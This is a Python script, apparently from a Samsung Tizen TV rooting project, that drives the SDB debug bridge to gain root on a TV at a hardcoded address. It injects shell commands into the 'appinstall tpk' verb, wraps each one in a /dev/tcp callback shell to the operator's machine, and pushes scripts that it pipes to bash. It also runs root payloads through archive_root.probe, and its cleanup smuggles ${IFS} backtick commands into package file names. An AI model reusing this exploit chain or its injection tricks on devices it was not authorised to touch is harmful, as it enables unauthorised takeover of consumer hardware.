"""One-shot archive-root verification using the existing AeroTizen transport.

Uses reviewed upstream source and executes the explicitly supplied commands.
Records command results before session teardown so a launcher timeout cannot
hide the outcome of an already completed operation.
"""
import asyncio
import argparse
import json
import re
import secrets
import socket
import sys
import threading
from dataclasses import asdict
from pathlib import Path

BASE = Path(__file__).resolve().parent
sys.path.insert(0, str(BASE / 'root-research' / 'src'))
from aerotizen.sdb import Sdb
from samsung_tv_root import archive_root
from samsung_tv_root.sdb import CaptureResult, build_shell_injection


class AeroTransport:
    def __init__(self, executable, tv_host, timeout=15):
        self.tv_host = tv_host
        self.timeout = timeout
        self.gates = []

    def connect(self):
        with Sdb(self.tv_host, timeout=self.timeout).connect():
            pass

    def require_device(self):
        pass

    def require_shell_injection(self):
        result = self.capture('id')
        if 'uid=901(sdk)' not in result.output or '[exit:0]' not in result.output:
            raise RuntimeError('SDK diagnostic identity did not match')

    def push(self, local_path, remote_path):
        with Sdb(self.tv_host, timeout=self.timeout).connect() as s:
            s.push(Path(local_path).read_bytes(), str(remote_path))

    def capture(self, command, *, callback_host=None, bind_host=None, port=0,
                timeout=30, **kwargs):
        runtime_query = command == '/usr/bin/dotnet --list-runtimes'
        if runtime_query:
            command = 'ls -1 /usr/share/dotnet/shared/Microsoft.NETCore.App/'
        route = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        route.connect((self.tv_host, 9))
        callback = callback_host or route.getsockname()[0]
        route.close()
        with socket.socket() as listener:
            listener.bind((bind_host or callback, port))
            listener.listen(2)
            listener.settimeout(timeout)
            callback_port = listener.getsockname()[1]
            wrapped = (f'exec 3<>/dev/tcp/{callback}/{callback_port};'
                       f'{{ {command}; }} >&3 2>&3;'
                       'printf "\\n[exit:%s]\\n" "$?" >&3;exec 3>&-')
            token = secrets.token_hex(8)
            self.gates.append('/tmp/s-' + token)
            launch = wrapped
            script_path = None
            if len(('0 appinstall tpk ' + build_shell_injection(launch, token)).encode()) > 510:
                script_path = f'/home/owner/share/tmp/sdk_tools/m8-check-{token}.sh'
                with Sdb(self.tv_host, timeout=self.timeout).connect() as s:
                    s.push(wrapped.encode(), script_path)
                launch = f'cat {script_path}|bash;rm -f {script_path}'
            verb = '0 appinstall tpk ' + build_shell_injection(launch, token)
            if len(verb.encode()) > 510:
                raise RuntimeError('SDB command length exceeds reviewed bound')
            state = {}

            def run():
                try:
                    with Sdb(self.tv_host, timeout=timeout).connect() as s:
                        state['output'] = s.shell(verb)
                except Exception as e:
                    state['error'] = repr(e)

            worker = threading.Thread(target=run, daemon=True)
            worker.start()
            conn, addr = listener.accept()
            if addr[0] != self.tv_host:
                conn.close()
                raise RuntimeError('Unexpected diagnostic callback peer')
            with conn:
                conn.settimeout(timeout)
                chunks = []
                while True:
                    chunk = conn.recv(16384)
                    if not chunk:
                        break
                    chunks.append(chunk)
                    if sum(map(len, chunks)) > 1024 * 1024:
                        raise RuntimeError('Diagnostic output exceeded 1 MiB')
            worker.join(3)
            if worker.is_alive():
                raise RuntimeError('SDB launcher did not finish')
            if 'error' in state:
                raise RuntimeError(state['error'])
            output = b''.join(chunks).decode(errors='replace')
            if runtime_query and '[exit:0]' in output:
                versions = [v.strip() for v in output.splitlines()
                            if re.fullmatch(r'\d+\.\d+\.\d+', v.strip())]
                output = ''.join(f'Microsoft.NETCore.App {v} [/usr/share/dotnet/shared/Microsoft.NETCore.App]\n'
                                 for v in versions) + '\n[exit:0]\n'
            return CaptureResult(output=output, transport_returncode=0)


instances = []
def transport_factory(*args, **kwargs):
    client = AeroTransport(*args, **kwargs)
    instances.append(client)
    return client


async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--commands-file', type=Path)
    parser.add_argument('--output', type=Path, default=BASE / 'temporary-root-result.json')
    args = parser.parse_args()
    commands = tuple(json.loads(args.commands_file.read_text())) if args.commands_file else (
        'id; uname -rm; grep -E "^(Uid|Gid|CapEff):" /proc/self/status',
        'cat /proc/mounts; cat /proc/partitions',
    )
    archive_root.find_sdb = lambda: Path('AeroTizen-native-Python-transport')
    archive_root.SdbClient = transport_factory
    from samsung_tv_root.root_agent import RootAgentConnection
    original_execute = RootAgentConnection.execute
    recorded = []
    async def record_execute(self, command, timeout):
        result = await original_execute(self, command, timeout)
        recorded.append({'command': command, **asdict(result)})
        args.output.with_suffix('.commands.json').write_text(
            json.dumps(recorded, ensure_ascii=False, indent=2))
        return result
    RootAgentConnection.execute = record_execute
    result = await archive_root.probe(
        '192.168.100.104', model='LS32BM80BUCXXF',
        payloads=BASE / 'root-payloads31', accept_timeout=25,
        commands=commands,
    )
    args.output.write_text(json.dumps(result, ensure_ascii=False, indent=2))
    print(json.dumps(result, ensure_ascii=False, indent=2))
    # Gates prevent duplicate package-name evaluation; delete after all SDB calls.
    for client in instances:
        for gate in client.gates:
            with Sdb(client.tv_host).connect() as s:
                s.shell('0 appinstall tpk new.tpk`rmdir${IFS}' + gate + '`.tpk')


if __name__ == '__main__':
    asyncio.run(main())
